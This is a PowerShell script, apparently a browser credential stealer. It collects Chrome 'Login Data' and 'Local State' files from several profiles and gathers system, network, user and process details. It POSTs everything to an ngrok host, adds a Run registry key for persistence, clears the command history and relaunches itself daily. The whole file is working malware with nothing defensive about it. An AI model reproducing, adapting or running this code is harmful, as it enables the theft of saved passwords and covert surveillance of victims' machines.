$var += Get-Content "Local State"

cd Default

$var += Get-Content "Login Data"

    # try profiles if null, Brute Force style

$Folder = 'Profile 1'
if (Test-Path -Path $Folder) { 
   cd $Folder
} else {
    "Path doesn't exist."
}

$var += Get-Content "Login Data"

$Folder = 'Profile 2'
if (Test-Path -Path $Folder) { 
   cd $Folder
} else {
    "Path doesn't exist."
}

$Folder = 'Profile 3'
if (Test-Path -Path $Folder) { 
   cd $Folder
} else {
    "Path doesn't exist."
}

$var += Get-Content "Login Data"

$Folder = 'Profile 4'
if (Test-Path -Path $Folder) { 
   cd $Folder
} else {
    "Path doesn't exist."
}

$var += Get-Content "Login Data"

$Folder = 'Profile 5'
if (Test-Path -Path $Folder) { 
   cd $Folder
} else {
    "Path doesn't exist."
}

$var += Get-Content "Login Data"

$Folder = 'Profile 6'
if (Test-Path -Path $Folder) { 
   cd $Folder
} else {
    "Path doesn't exist."
}

$var += Get-Content "Login Data"

$Folder = 'Profile 7'
if (Test-Path -Path $Folder) { 
   cd $Folder
   $var += Get-Content "Login Data"
} else {
    "Path doesn't exist."
}

$var += Get-Content "Login Data"

$Folder = 'Profile 8'
if (Test-Path -Path $Folder) { 
   cd $Folder
} else {
    "Path doesn't exist."
}

$var += Get-Content "Login Data"

start-sleep 4



$var += Get-NetIPConfiguration 

$var += whoami

$var += Get-ComputerInfo

$var += Get-Date

$var += ps 

Start-Sleep -Seconds 3

#start http post 

#httpsend

    $Response = Invoke-WebRequest -Method Post -URI https://8522-70-31-164-93.ngrok-free.app -body $var -UseBasicParsing

#set per

New-ItemProperty -Path "Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
    -Name "grabber4.ps1" `
    -Value "%LOCALAPPDATA%\Google\Chrome\User Data\grabber4.ps1 -autostart"

cd..

Clear-History

start-sleep 86400

./grabber4.ps1
